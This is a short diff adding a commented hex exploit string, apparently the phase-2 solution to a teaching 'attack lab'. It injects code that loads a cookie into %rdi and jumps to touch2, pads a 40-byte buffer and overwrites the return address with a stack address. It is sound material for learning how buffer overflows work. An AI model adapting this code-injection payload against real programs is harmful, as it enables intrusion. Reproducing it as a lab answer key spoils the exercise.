@@ -1,0 +1,12 @@
+/* question2: */
+48 c7 c7 fa 97 b9 59 /* mov $0x59b997fa      %rdi 设置cooike */
+68 ec 17 40 00       /* pushq  $0x4017ec     push touch2的地址 */
+c3                   /* ret                  返回 */
+/* 上面一共13个字节, buf一共40个字节所以需要填充 40-13=27个字节 */
+00 00 00 00 00 00 00 00 /* 8 bytes */
+00 00 00 00 00 00 00 00 /* 8 bytes */
+00 00 00 00 00 00 00 00 /* 8 bytes */
+00 00 00                /* 3 bytes */
+78 dc 61 55 00 00 00 00 /* exploit string code 的开始地址（即get buf的栈地地址) */
+
+
